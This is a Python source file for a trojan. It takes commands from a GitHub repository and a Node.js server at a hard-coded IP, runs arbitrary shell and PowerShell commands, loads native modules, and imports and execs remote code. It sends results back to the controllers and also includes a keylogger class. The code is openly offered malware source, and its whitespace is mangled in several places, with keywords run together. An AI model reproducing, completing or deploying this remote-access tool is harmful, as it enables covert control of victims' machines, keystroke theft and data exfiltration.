import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import subprocess
import requests
import ctypes
import os
from datetime import datetime
from pynput import keyboard  # Added for keylogger# Define a function to connect to GitHubdefgithub_connect():
    withopen('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

# Define a function to get file contents from GitHubdefget_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

# Keylogger functionalityclassKeylogger:
    def__init__(self, log_file="keylog.txt"):
        self.log_file = log_file

    defon_press(self, key):
        try:
            withopen(self.log_file, "a") as f:
                f.write(key.char)
        except AttributeError:
            withopen(self.log_file, "a") as f:
                f.write(f"[{key}]")

    defrun(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# Trojan class definitionclassTrojan:
    def__init__(self, id, node_server_url):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{self.id}/'
        self.repo = github_connect()
        self.node_server_url = node_server_url
        self.running = Truedefget_github_config(self):
        try:
            config_json = get_file_contents('config', self.config_file, self.repo)
            decoded_config = base64.b64decode(config_json).decode('utf-8')
            return json.loads(decoded_config)
        except Exception as e:
            print(f"Error fetching GitHub config: {e}")
            raisedefget_nodejs_config(self):
        try:
            response = requests.get(f"{self.node_server_url}/config")
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to get config from Node.js server: {e}")
            returnNonedefsend_command_result(self, command, result):
        try:
            payload = {
                "command": command,
                "result": result
            }
            requests.post(f"{self.node_server_url}/command", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to send command result to Node.js server: {e}")

    defupdate_status(self, status):
        try:
            payload = {
                "id": self.id,
                "status": status
            }
            requests.post(f"{self.node_server_url}/status", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to update status on Node.js server: {e}")

    defstore_shell_command_result(self, command, result):
        try:
            message = f"shell_command_{datetime.now().isoformat()}"
            remote_path = f'{self.data_path}{message}.data'
            bindata = base64.b64encode(bytes(f'Command: {command}\nResult:\n{result}', 'utf-8'))
            self.repo.create_file(remote_path, message, bindata)
        except Exception as e:
            print(f"Error storing shell command result to GitHub: {e}")

    defexecute_command(self, command):
        ifisinstance(command, dict):
            command_type = command.get('type')
            if command_type == 'shell':
                shell_command = command.get('command')
                if shell_command:
                    try:
                        print(f"[*] Executing command: {shell_command}")
                        result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                        result = result.decode('utf-8')
                    except subprocess.CalledProcessError as e:
                        result = e.output.decode('utf-8')
                    self.send_command_result(shell_command, result)
                    self.store_shell_command_result(shell_command, result)
            elif command_type == 'module':
                module_name = command.get('module')
                if module_name:
                    if module_name notin sys.modules:
                        importlib.import_module(module_name)
                    thread = threading.Thread(target=self.module_runner, args=(module_name,))
                    thread.start()
            elif command_type == 'c_module':
                module_name = command.get('module')
                if module_name:
                    self.run_c_module(module_name)
            elif command_type == 'powershell':  # Added PowerShell command type
                powershell_command = command.get('command')
                if powershell_command:
                    try:
                        print(f"[*] Executing PowerShell command: {powershell_command}")
                        result = subprocess.check_output(["powershell", "-Command", powershell_command], stderr=subprocess.STDOUT)
                        result = result.decode('utf-8')
                    except subprocess.CalledProcessError as e:
                        result = e.output.decode('utf-8')
                    self.send_command_result(powershell_command, result)
                    self.store_shell_command_result(powershell_command, result)
        else:
            print(f"Invalid command format: {command}")

    defmodule_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    defstore_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        self.repo.create_file(remote_path, message, bindata)

    defload_c_module(self, module_name):
        module_path = os.path.join('modules', module_name)
        if os.name == 'nt':  # Windows
            module_path += '.dll'else:  # Linux
            module_path += '.so'try:
            print(f"[*] Loading C module from path: {module_path}")
            return ctypes.CDLL(module_path)
        except Exception as e:
            print(f"Error loading C module {module_name} from {module_path}: {e}")
            returnNonedefrun_c_module(self, module_name):
        try:
            print(f"[*] Attempting to load C module: {module_name}")
            c_module = self.load_c_module(module_name)
            if c_module isnotNone:
                run_func = c_module.run
                run_func.restype = ctypes.c_char_p
                result = run_func()
                print(f"[*] C module '{module_name}' executed with result: {result.decode()}")
                self.store_module_result(result.decode())
            else:
                print(f"[*] Failed to load C module: {module_name}")
        except Exception as e:
            print(f"Error running C module {module_name}: {e}")

    defrun(self):
        while self.running:
            github_config = self.get_github_config()
            nodejs_config = self.get_nodejs_config()

            if nodejs_config:
                if nodejs_config.get('stop'):
                    self.running = False
                    self.update_status("Trojan stopped.")
                    breakfor command in nodejs_config.get('commands', []):
                    self.execute_command(command)

            time.sleep(5)

classGitImporter:
    def__init__(self):
        self.current_module_code = ""deffind_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library isnotNone:
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            returnNonedefcreate_module(self, spec):
        returnNonedefexec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    NODE_SERVER_URL = "http://10.0.100.100:3000"# Change this to your Node.js server URL
    trojan = Trojan('abc', NODE_SERVER_URL)
    trojan.run()

